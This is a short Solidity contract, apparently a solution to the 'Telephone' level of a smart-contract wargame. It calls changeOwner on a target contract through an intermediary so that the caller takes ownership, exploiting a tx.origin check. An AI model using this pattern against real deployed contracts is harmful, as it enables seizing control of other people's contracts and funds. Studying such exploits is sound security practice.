// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone private teleContract;

    constructor(address _tele) {
        teleContract = Telephone(_tele);
    }

    function attack() external {
        teleContract.changeOwner(msg.sender);
    }
}
